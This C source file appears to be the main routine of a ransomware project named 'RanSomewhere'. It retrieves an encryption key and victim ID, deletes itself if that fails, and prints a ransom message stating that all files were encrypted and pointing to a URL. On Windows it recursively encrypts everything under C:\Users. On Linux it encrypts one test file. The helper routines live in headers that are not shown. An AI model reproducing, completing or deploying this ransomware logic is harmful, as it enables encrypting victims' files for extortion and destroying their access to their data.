#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keygen.h"
#include "delete.h"
#include "config.h"
#include "utils.h"
#include "encrypt.h"
#include "files.h"

#ifdef _WIN32
#include <windows.h>
#include <ShlObj.h>
#else
#include <unistd.h>
#endif


int main(int argc, char *argv[]) {
    /*
    #ifndef _WIN32
        self_delete(argv[0]);
    #endif
    */
    char key[512];
    int id;
    if (get_key(&id, key) == 0) {
        self_delete(argv[0]);
    }
    char readme[1024];
    snprintf(readme, sizeof(readme), "All your files were encrypted, go to %s\nYour ID is: %d\n", URL, id);
    printf("%s", readme);
    /*
    if (create_readme(readme) == 0) {
            self_delete(argv[0]);
    }*/
    #ifdef _WIN32
        enumerate("C:\\Users", key);
    #else
        // linux -> test
        char *content = read_file("/home/nk0/Desktop/RanSomewhere/tests/file.txt");
        printf("Before: %s\n", content);
        if (encrypt("/home/nk0/Desktop/RanSomewhere/tests/file.txt", key) == 0) {
            printf("File encrypted successfully\n");
            printf("After: %s\n", content);
        } else {
            printf("Error encrypting file\n");
        }
    #endif

    return 0;
}

